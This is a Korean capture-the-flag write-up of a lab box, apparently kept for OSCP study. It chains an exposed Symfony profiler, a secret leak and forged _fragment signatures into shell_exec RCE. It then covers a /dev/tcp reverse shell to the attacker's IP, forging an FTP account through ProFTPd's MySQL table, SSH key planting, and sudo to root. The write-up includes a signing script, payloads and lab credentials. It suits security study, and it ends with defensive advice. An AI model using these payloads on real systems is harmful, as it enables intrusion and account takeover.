---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/symfony
  - tech/web/info-disclosure
  - tech/web/rce
  - tech/db/mysql
  - tech/service/proftpd
  - tech/priv/sudo
type: machine
platform: pg
os: linux
status: solved
manual_tags: true
manual_cves: true
---
# Fractal

> [!info] 상단 요약
> 타겟 192.168.248.233 · Linux(Ubuntu 20.04.5) · Fundamental · 플래그 2개
> Symfony 3.4 `app_dev.php` 프로파일러 노출 → `parameters.yml` 에서 app **secret** 회수 → `_fragment` URI 서명 위조로 **RCE(www-data)** → ProFTPd MySQL 설정에서 DB 자격증명 → `ftpuser` 테이블에 **uid 1000 매핑 FTP 계정 삽입** → FTP 로 benoit 홈에 SSH 키 업로드 → **SSH(benoit)** → `sudo ALL NOPASSWD` → root

## 0. 이 박스에서 배우는 것

- **Symfony 개발 프론트컨트롤러(`app_dev.php`) 노출** — 프로덕션에 dev 진입점이 남으면 `_profiler` 가 통째로 열림. `robots.txt` 의 `Disallow: /app_dev.php` 가 그 자체로 신호.
- **Symfony `_fragment` RCE** — 유출된 `secret` 으로 `UriSigner` 의 HMAC 을 로컬에서 위조. 서명만 맞으면 임의 PHP 콜러블 호출 가능.
- **ProFTPd + mod_sql_mysql 의 계정이 DB 행 하나** — 인증 DB 에 쓸 수 있으면 임의 uid/homedir 로 FTP 계정을 만들 수 있음. FTP 세션이 그 uid 권한으로 돌아 **소유자만 쓰던 홈에 파일을 심는** 우회.
- **시험 출제 가능성**: 프레임워크 디버그 모드 노출 → secret → 서명 위조 RCE 는 Symfony/Rails/Flask 계열에서 반복되는 유형. ProFTPd-MySQL 연동 오용은 덜 흔하나 「인증 저장소에 쓰기 = 계정 위조」라는 일반 패턴의 사례.

## 1. 정찰

### Nmap

3단 스캔. 즉시 구간은 top-1000, 전체 포트와 UDP 는 tmux 백그라운드로 던져놓고 회수.

```
nmap --privileged -Pn -n -sCV -p 21,22,80 -oN nmap-quick.txt 192.168.248.233
nmap -sCV -p- -Pn -n -A --min-rate 5000 -oN nmap-full.txt 192.168.248.233
sudo nmap -sU -Pn -n --top-ports 100 --max-retries 1 -T4 -oN nmap-udp-top100.txt 192.168.248.233
```

출처: `~/PG/Fractal/nmap-quick.txt`, `nmap-full.txt`, `nmap-udp-top100.txt`

```
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome!
| http-robots.txt: 2 disallowed entries 
|_/app_dev.php /app_dev.php/*
```

- 전체 포트(`-p-`) 결과 `Not shown: 64513 closed tcp ports (reset), 1019 filtered tcp ports (no-response)` — **추가 포트 없음**. UDP top-100 은 전부 `open|filtered (no-response)` 로 판정 불가. 21/22/80 이 전부.
- ProFTPd 는 버전 배너를 숨김(`ProFTPD` 만). 실제 버전은 셸 획득 후 `dpkg` 로 확정 → `1.3.6c-2ubuntu0.1`.
- `robots.txt` 가 `# symfony 3.4 robots.txt` 주석과 함께 `/app_dev.php` 를 노출 — **개발 진입점 존재의 1차 근거**.

### 웹 진입점

첫 화면은 "Fractals" 정적 페이지(`title=Welcome!`). gobuster 결과 중 의미 있는 것 둘 — `/app.php` 301 → `/`(Symfony 프로덕션 프론트컨트롤러), `/phpmyadmin` 301 → `/phpmyadmin/`. `/server-status` 는 403.

응답 본문 푸터가 프레임워크를 자기 입으로 밝힘 — `<footer class="mastfoot">` 안에 **`Build with Symfony`**. `robots.txt` 와 독립된 두 번째 지문임.

```html
      <footer class="mastfoot mt-auto">
        <div class="inner">
          <p>Build with Symfony</p>
        </div>
      </footer>
```

출처: `~/PG/Fractal/web-80/root.body` 46–50행

![[PG-Fractal-index.png]]

스크린샷에는 푸터가 없음 — 헤드리스 캡처가 뷰포트 1280×900 이고 본문에 전폭 이미지 3장이 들어가 푸터가 접힘 아래로 밀림. 푸터 근거는 스크린샷이 아니라 위 응답 본문임.

버전 근거 2개 교차:
- `robots.txt` 1행 주석 `# symfony 3.4 robots.txt` (출처: `web-80/probe_robots.txt`)
- 프로파일러 Configuration 패널의 `Symfony version` = **3.4.46** (출처: `sym/app_dev.php__profiler_latest_panel_config.html`)

## 2. 취약점 분석 — Symfony 프로파일러 노출과 `_fragment` 서명 위조

### 왜 취약한가 — dev 프론트컨트롤러

Symfony 는 프론트컨트롤러가 둘. `app.php`(prod)와 `app_dev.php`(dev). dev 는 `APP_DEBUG=1` 로 **웹 프로파일러**를 켜고, `_profiler` 라우트를 붙임. 배포 시 `app_dev.php` 를 지우거나 IP 화이트리스트를 걸어야 하는데 그대로 노출됨.

배치 프로빙으로 노출 경로 확정 (출처: `~/PG/Fractal/sym/`):

```
43503  app_dev.php                              ← dev 프론트, 디버그 툴바
97468  app_dev.php/_profiler/latest
82451  app_dev.php/_profiler/phpinfo
13958  app_dev.php/_profiler/open?file=app/config/config.yml
 6922  app_dev.php/_profiler/open?file=app/config/parameters.yml   ← secret 회수
  471  _profiler          → 404 Not Found       ← prod 경로에는 없음
  471  _profiler/latest   → 404 Not Found
```

(바이트 수는 회수한 응답 본문 크기. 404 두 건은 본문이 Symfony 기본 오류 페이지 `The server returned a "404 Not Found"` 임을 눈으로 확인.)

`_profiler/open?file=` 는 프로파일러가 소스 뷰어로 노출하는 엔드포인트. **임의 파일 열람은 아님** — Symfony 3.4 `ProfilerController::openAction` 이 `$this->baseDir`(프로젝트 루트)를 앞에 붙이고 `preg_match("'(^|[/\\\\])\.'", $file)` 로 **점으로 시작하는 경로 세그먼트를 전부 거부**함. 즉 `../` 트래버설도 `.env` 류 숨김파일도 막히고, **프로젝트 루트 아래 일반 파일만** 읽힘. 그 범위 안에 `app/config/parameters.yml` 이 들어 있는 것이 이 박스의 사고. (근거: symfony/symfony 3.4 브랜치 `ProfilerController.php` 원문. 이 박스에서 트래버설을 실제로 시도하지는 않았음.)

`parameters.yml` 을 그대로 읽어냄:

```
parameters:
    database_host: 127.0.0.1
    database_name: symfony
    database_user: symfony
    database_password: symfony_db_password
    secret: 48a8538e6260789558f0dfe29861c05b
```

![[PG-Fractal-profiler-parameters.png]]

여기 `secret` 이 RCE 의 열쇠. (`database_*` 는 Symfony 앱용 MySQL 이고, **권한상승에 쓴 DB 는 별개의 ProFTPd DB** — 4장에서 구분.)

### 왜 이 페이로드인가 — `_fragment` + `UriSigner`

Symfony 의 `FragmentListener` 는 `/_fragment` 요청을 받아 지정한 컨트롤러(임의 PHP 콜러블 포함)를 서브리퀘스트로 실행. 무단 실행을 막으려고 `_hash` 파라미터로 URI 서명을 검증. 서명 알고리즘(`HttpKernel\UriSigner`, Symfony 3.4):

```
hash = base64_encode( hash_hmac('sha256', $uri, $secret, true) )
```

`$uri` = 스킴+호스트+경로+정렬된 쿼리스트링(`_hash` 제외). secret 을 알면 **로컬에서 유효한 서명을 계산**할 수 있음.

서명기 스크립트 (출처: `~/PG/Fractal/sign_fragment.py`):

```python
import hmac, hashlib, base64
from urllib.parse import quote
SECRET = "48a8538e6260789558f0dfe29861c05b"
BASE   = "http://192.168.248.233/app_dev.php/_fragment"
def sign(path_value):
    q   = "_path=" + quote(path_value, safe="")
    uri = BASE + "?" + q
    h   = base64.b64encode(hmac.new(SECRET.encode(), uri.encode(), hashlib.sha256).digest()).decode()
    return uri + "&_hash=" + quote(h, safe="")
```

`_path` 는 프래그먼트가 `parse_str` 로 다시 파싱하는 내부 쿼리. `_controller=<함수>&<인자>...` 형태. 그래서 인자는 **두 번 인코딩**됨 — 안쪽은 `_path` 내부 파라미터 구분(`&`,`=`)을 살리려고, 바깥쪽은 `_path` 값 전체를 rawurlencode.

## 3. Foothold — RCE 로 www-data 셸

컨트롤러 후보를 배치로 발사 (출처: `~/PG/Fractal/frag/`):

**전부 500 이 돌아온다.** 판정은 상태코드가 아니라 **예외 클래스**로 한다:

| `_controller` | 예외 | 읽는 법 |
|---|---|---|
| `system&command=id` | `RuntimeException` — `Controller "system" requires that you provide a value for the "$return_value" argument.` | ArgumentResolver 가 2번째 인자를 못 채움 |
| `passthru&command=id` | 동일 (`$return_value`) | 같은 이유 |
| `exec&cmd=id` | `RuntimeException` — `"$output" argument` | 같은 이유 |
| `system` + 2번째 인자 채워 재시도 | `ContextErrorException` — `Warning: Parameter 2 to system() expected to be a reference, value given` | 참조 인자라 값 전달 불가 |
| `shell_exec&cmd=id` | **`LogicException` — `The controller must return a response (uid=33(www-data) gid=33(www-data) groups=33(www-data) given).`** | **명령 출력이 예외 메시지에 실려 나옴** |

즉 성공 신호가 200 이 아니라 **500 안에 박힌 문자열**이다. `shell_exec` 는 인자가 하나뿐이라 ArgumentResolver 를 통과하고, 반환한 문자열이 Response 가 아니라서 HttpKernel 이 `LogicException` 을 던지는데 **그 메시지에 명령 출력이 그대로 들어간다.** dev 모드 디버그 예외 페이지가 그것을 렌더 → 출력 회수 가능. `system`/`passthru`/`exec` 는 2번째 인자가 참조라 프래그먼트 인자 전달과 맞지 않아 포기.

RCE 래퍼 (출처: `~/PG/Fractal/rce.py`) — `shell_exec` 로 임의 명령.

리버스셸은 **443 을 먼저 쐈고 안 붙었다**(`frag/revshell443.html` 0바이트, 10:06:51). 그 다음에야 아웃바운드 egress 를 배치로 점검:

```
for p in 443 80 53 8080 4444; do timeout 3 bash -c "echo OUT$p > /dev/tcp/192.168.45.207/$p"; done
```

(응답은 `frag/egress_test.html` = `done`. 루프 자체는 `rce.py` 인자로 넘긴 것이라 원문이 파일로 남아 있지는 않음.)

`tcpdump -i tun0` + 포트별 리스너로 **80·53 도착, 443 미도착**을 관측했으나 **그 화면은 파일로 미보존** — 산출물로 확정되는 것은 **80 뿐**이다(`harvest_root.txt` 프로세스 목록에 `bash -c bash -i >& /dev/tcp/192.168.45.207/80 0>&1` 가 살아 있음). 53 도착·443 미도착은 `[가정]`. 443 차단 여부도 `[가정]` — tun0 캡처는 성공 회선만 보이므로 "시도했는데 막혔다"와 "안 나갔다"를 구분 못 함.

포트 80 으로 리버스셸:

```
bash -c "bash -i >& /dev/tcp/192.168.45.207/80 0>&1" &
```

타겟 pty(출처: tmux `fr-shell` capture-pane):

```
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.233] 60850
www-data@fractal:/var/www/html/web$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 4. 권한상승

### www-data → benoit (ProFTPd DB 계정 위조)

셸 즉시 `harvest.sh` 실행. 일반 사용자는 benoit 하나 — `/etc/passwd` 에 `benoit:x:1000:1000::/home/benoit:/bin/sh`. 홈은 `drwxr-xr-x 2 benoit benoit`(출처: `frag/enum1.html` 의 `/home` 리스팅)이라 www-data 는 **읽기는 되고 쓰기는 안 됨**.

`local.txt` 자체는 `-r--r--r--` 라 www-data 도 읽을 수 있었음(출처: `harvest_root.txt` FLAGS). **그래도 benoit 셸이 필요한 이유는 시험 규정** — 웹셸/비대화형 RCE 로 읽은 플래그는 0점이라 대화형 셸에서 다시 읽어야 함.

ProFTPd 설정에서 DB 연동 자격증명 (출처: `harvest_root.txt`, `frag/enum1.html` → `/etc/proftpd/sql.conf`):

```
SQLBackend mysql
SQLAuthTypes OpenSSL Crypt
SQLConnectInfo proftpd@localhost proftpd protfpd_with_MYSQL_password
SQLUserInfo ftpuser userid passwd uid gid homedir shell
SQLMinID 33
```

`ftpuser` 테이블 = ProFTPd 의 가상 사용자 저장소. 각 행이 `uid/gid/homedir` 를 지정 → FTP 세션은 **그 uid 권한으로** 파일시스템에 접근. 기존 행은 `www`(uid 33)뿐.

benoit 홈은 www-data 가 못 쓰지만, **uid 1000 으로 매핑된 FTP 계정을 만들면** FTP 세션이 benoit 권한을 얻어 홈에 쓸 수 있음. 계정 삽입:

```
INSERT INTO ftpuser (userid,passwd,uid,gid,homedir,shell)
VALUES ('hacker','{md5}xKZnXxuuNbTj2DiMKnfv2A==',1000,1000,'/home/benoit','/bin/bash');
```

`passwd` 는 `SQLAuthTypes OpenSSL` 형식 — `{md5}base64(md5_raw(password))`. `ftppass123` 을 그 형식으로:

```
printf '%s' 'ftppass123' | openssl dgst -binary -md5 | openssl base64   → {md5}xKZnXxuuNbTj2DiMKnfv2A==
```

benoit 홈에 SSH 키 업로드(FTP 세션이 uid 1000 이라 `.ssh` 생성·쓰기 가능). 출처: `~/PG/Fractal/ftp_upload.sh`

```bash
#!/bin/bash
mkdir -p sshdir && cp benoit_key.pub sshdir/authorized_keys
cd sshdir
lftp -u hacker,ftppass123 192.168.248.233 <<LFTP 2>&1
set ssl:verify-certificate no
set ftp:ssl-allow no
mkdir .ssh
cd .ssh
put authorized_keys
chmod 600 authorized_keys
ls -la
bye
LFTP
```

`set ftp:ssl-allow no` 는 lftp 가 AUTH TLS 를 시도하다 인증서에서 걸리는 것을 막으려고 붙인 것. **이 박스에서 빼고 시도해 본 적은 없음** — 필수였는지는 관측 없음.

업로드 성공은 정리 단계에서 역으로 확인됨 — 정리 직전 `ls -la /home/benoit/.ssh` 가 `-rw-r--r-- 1 benoit benoit 91 Aug 21 01:14 authorized_keys` 를 보여줌(출처: `cleanup.txt`). 91바이트는 `benoit_key.pub` 크기와 일치. **FTP 세션 로그 자체는 파일로 미보존.**

SSH 로 benoit 접속(대화형 pty 셸 — 웹셸 아님):

```
$ whoami; id; hostname; hostname -I; date; cat /home/benoit/local.txt
benoit
uid=1000(benoit) gid=1000(benoit) groups=1000(benoit)
fractal
192.168.248.233
Fri 21 Aug 2026 01:15:21 AM UTC
f62124f1ae5f1ab510a1a4a5de5bf0d5
```

출처: `~/PG/Fractal/proof_user.txt`. **프롬프트가 `$` 하나뿐인 것은 benoit 의 로그인 셸이 `/bin/sh`(dash) 라서** — 호스트명이 안 붙는다고 웹셸이 아니다. 대화형 pty 였다는 근거는 `harvest_root.txt` 프로세스 트리에 `sshd: benoit [priv]` → `sshd: benoit@pts/3` → `-sh` 가 남아 있는 것.

### benoit → root (`sudo NOPASSWD: ALL`)

셸 잡자마자 5종 열거. `sudo -l` 이 즉시 끝냄 — benoit 는 **비밀번호 없이 전 명령** 실행 가능.

`[가정]` `sudo -l` 출력 원문(`(ALL) NOPASSWD: ALL` 형태)은 SSH 세션 스크롤백에만 있었고 **파일로 미보존**. 산출물로 확정되는 것은 아래 `proof_root.txt` — `sudo -i` 가 **비밀번호 프롬프트 없이** 곧바로 root pty 를 내준 것이 NOPASSWD 의 실측 증거다. (`harvest_root.txt` 의 SUDO 절은 root 로 실행한 것이라 root 자신의 `sudo -l` 이고, benoit 것이 아님.)

```
sudo -i    → root@fractal:~#
```

SUID/getcap 에 특이점 없음(`pkexec` 0.105-26ubuntu1.3 = PwnKit 대상이지만 sudo 로 이미 root 라 불필요). 크론 없음.

## 5. 플래그

| | 위치 | 값 |
|---|---|---|
| user | `/home/benoit/local.txt` | `f62124f1ae5f1ab510a1a4a5de5bf0d5` |
| root | `/root/proof.txt` | `3fccb8b2b4eb6870d248850dbd7994ea` |

둘 다 **같은 대화형 SSH pty 세션**에서 `whoami; id; hostname; hostname -I; date; cat <flag>` 한 화면으로 회수. user(`01:15:21 UTC`) → `sudo -i` → root(`01:16:13 UTC`) 순서.

```
$ sudo -i
root@fractal:~# whoami; id; hostname; hostname -I; date; cat /root/proof.txt
root
uid=0(root) gid=0(root) groups=0(root)
fractal
192.168.248.233
Fri 21 Aug 2026 01:16:13 AM UTC
3fccb8b2b4eb6870d248850dbd7994ea
root@fractal:~#
```

출처: `~/PG/Fractal/proof_user.txt`, `proof_root.txt`. 앞의 `$` 는 4장의 benoit dash 프롬프트와 같은 셸 — 그 셸이 `sudo -i` 로 `root@fractal:~#` 가 된 것이 한 파일에 이어져 있어 **웹셸이 아님이 파일 하나로 증명**됨.

⚠️ 두 `proof_*.txt` 의 **파일 mtime 은 root 쪽이 먼저**(10:16) user 쪽이 나중(10:18)이다. 본문 `date` 가 UTC 라 KST 로 환산하면 user 10:15:21 → root 10:16:13 으로 서사와 일치 — user 파일을 나중에 스크롤백에서 옮겨 적었을 뿐이다. mtime 만 보고 순서를 뒤집어 읽지 말 것.

## 6. 막혔던 지점 / 시행착오

- **500 을 실패로 읽을 뻔함** — `_fragment` 컨트롤러는 **성공해도 500 이다.** `shell_exec` 가 통한 응답도 HTTP 500 이고, 명령 출력은 `LogicException: The controller must return a response (... given)` 메시지 안에 들어 있다. 상태코드로 판정했으면 정답을 실패로 버렸을 자리. → 「디버그 모드가 켜진 프레임워크에서는 **예외 메시지가 출력 채널**이다」.
- **`system`/`passthru`/`exec` 컨트롤러가 전부 실패** — `Controller "system" requires that you provide a value for the "$return_value" argument`. 2번째 인자를 채워 재시도하면 이번엔 `Warning: Parameter 2 to system() expected to be a reference, value given` 로 죽음 — 참조 인자라 프래그먼트로는 못 넘긴다. **`shell_exec` 는 인자 하나뿐**이라 바로 통함. 후보를 배치로 던져 diff 한 덕에 순차 삽질 없이 판별(`frag/` 에 응답 14개가 그대로 남음). → 「임의 함수 호출 RCE 는 인자 시그니처가 단순한 함수부터」.
- **리버스셸 443 미도착** — 첫 시도(443)에서 connect-back 안 옴(`frag/revshell443.html` 0바이트). 방화벽으로 단정하기 전에 egress 를 `/dev/tcp` 배치(443/80/53/8080/4444)로 점검 → 80 으로 붙음. 「안 붙으면 포트를 배치로 점검하고 캡처로 계층 분리」 실천. Wombo·Bratarina 와 같은 패턴(성공 회선 80). ⚠️ **Kali 쪽 tcpdump·리스너 화면은 파일로 안 남겼다** — 다음부터는 그 출력도 리다이렉트할 것. 그래서 「53 도 나간다 / 443 은 막혔다」가 이 노트에서 `[가정]` 으로 남았다.
- **prod 경로로 프로파일러를 찾다 헛발** — `/_profiler`, `/_profiler/latest` 는 둘 다 **404**(`sym/_profiler.html`, `_profiler_latest.html`). 프로파일러 라우트는 `app_dev.php` **뒤에** 붙는다 — `app_dev.php/_profiler/...` 여야 열림. `app_dev.php/_configurator/` 도 `No route found` 404.
- **`web/config.php` 는 막혀 있었다** — 응답이 `This script is only accessible from localhost.` 46바이트(`sym/config.php.html`). Symfony 배포판의 로컬 IP 가드가 **여기엔 살아 있었다.** 같은 웹루트에서 `app_dev.php` 만 열린 것이라 「dev 진입점이 하나 막혔다고 다 막힌 게 아니다」.
- **phpMyAdmin 은 안 썼다 — 배제한 게 아니라 필요가 없었다** — `/phpmyadmin/` 이 실제 로그인 페이지를 냈고(`sym/phpmyadmin_.html`), `parameters.yml` 의 `symfony/symfony_db_password` 도 손에 있었다. 다만 그 계정은 **앱 DB(`symfony`)** 용이고 권한상승에 필요한 것은 **`proftpd` DB** 였다. phpMyAdmin 으로 `proftpd` DB 에 붙는 경로는 **시도하지 않았음** — RCE 셸에서 `mysql` 클라이언트로 바로 가는 쪽이 빨랐다.
- **최초 `harvest.sh` pty 블로킹** — pty 승격 직후 `sh harvest.sh` 를 前景 실행했더니 내부 `find /` 가 오래 걸려 pane 이 잠기고 이후 명령이 큐에 쌓임. 두 번째 셸(`fr-sh2`)에서 `sudo -l` 을 치다 `[sudo] password` 프롬프트에 `C-c` 를 보내자 리버스셸이 끊기며 세션째 사망. **교훈**: (1) `harvest.sh` 는 리다이렉트 후 결과만 회수, 前景 대기 금지. (2) 불안정한 nc 리버스셸에서 인터랙티브 프롬프트에 `C-c` 보내면 셸이 죽음 — SSH 로 승격한 뒤 열거하는 게 안정적. www-data 열거는 결국 **비대화형 RCE(`rce.py`)** 로 돌려 안정 회수.
- **DB 두 개 혼동 주의** — `parameters.yml` 의 `symfony/symfony_db_password` 는 Symfony 앱 DB. 권한상승에 쓴 것은 `sql.conf` 의 **별개 `proftpd` DB**(`proftpd/protfpd_with_MYSQL_password`, 오타 그대로). 앱 secret 회수와 FTP 계정 위조는 서로 다른 자격증명. 「저장소 이원화를 의심하라」의 사례.

## 7. OSCP 시험 관점

1. **`robots.txt`·프레임워크 배너를 읽어 dev 진입점을 찾아라.** `app_dev.php`(Symfony), `?XDEBUG`, `/rails/info`(Rails), Flask 디버거 등 — 디버그 모드 노출이 곧 secret·RCE.
2. **자동 도구 없이**: 프로파일러 프로빙은 `curl` 배치 for 루프. secret HMAC 서명은 python/php 로컬 계산(`sign_fragment.py`). sqlmap 등 불필요.
3. **`_fragment` RCE 재현 절차**: secret 회수 → `hash_hmac('sha256', uri, secret, true)` base64 → `_path` 이중 인코딩 → `shell_exec` 컨트롤러. 인자 하나짜리 함수 우선.
4. **리버스셸 안 붙으면**: egress 포트를 `/dev/tcp` 배치로 점검(443→80→53), `tcpdump -i tun0` 로 SYN 확인. TIME_WAIT `address already in use` 를 방화벽으로 오독 말 것.
5. **시간 배분**: Fundamental 박스. secret→RCE→DB→FTP→SSH→sudo 사슬이 명확해 손절 여지 적음. 여기서 태우는 곳은 리버스셸 포트·harvest 블로킹 같은 인프라 문제이지 벡터 판단이 아님.

## 8. 방어 관점

- 프로덕션에서 `app_dev.php` 삭제(또는 IP 화이트리스트 복원). 같은 웹루트의 `web/config.php` 는 `This script is only accessible from localhost.` 로 **가드가 살아 있었으므로**, `app_dev.php` 쪽만 가드가 빠진 것으로 판단 `[가정]` — `app_dev.php` 소스를 직접 읽지는 않았음.
- `secret` 유출 시 즉시 로테이션. 프로파일러 `open?file=` 는 트래버설이 막혀 있어도 **프로젝트 루트 아래 설정 파일은 그대로 읽히므로**, 가드만 믿지 말고 dev 진입점 자체를 없애는 것이 유일한 차단.
- ProFTPd 연동 DB 계정(`proftpd`)에 `INSERT` 권한을 주지 말 것 — 인증 조회는 `SELECT` 로 충분. 쓰기 권한이 임의 uid 계정 생성으로 직결.
- benoit 의 `NOPASSWD: ALL` 제거.

## 9. 참고 자료

- Symfony `UriSigner` (HttpKernel) — `_fragment` 서명 검증 로직
- ProFTPd `mod_sql` / `mod_sql_mysql` — SQL 기반 가상 사용자 인증
- GTFOBins `sudo` — `sudo -i`

## 남긴 흔적 / 정리

작업 전후 대조 (출처: `~/PG/Fractal/cleanup.txt`):

- **ftpuser 행 `hacker` 삭제** — 삭제 후 `SELECT` 로 `www` 만 남음 확인
- **`/home/benoit/.ssh` 제거** — 원래 없던 디렉터리(작업 중 생성), 삭제 후 `ls` 로 부재 확인
- **웹루트 임시 파일**(`/var/www/html/web/h.txt`,`h2.txt`) 삭제 확인
- **`/tmp/.h*`**(harvest 스크립트·출력) 삭제 확인
- **Kali 리스너·tmux**: `fr-shell`/`fr-http`/`fr-tcpd`/`fr-benoit` 및 recon 세션 전부 `tmux kill-session` 으로 이름 지정 종료, `ss -lntp` 로 80/443/53 리스너 부재 확인
- 타겟 마운트 생성 없음

## 관련

- [[_STATUS]]
- 성공 회선 80: [[Wombo]] · [[Bratarina]]
- 저장소 이원화 의심: [[Wheels]]
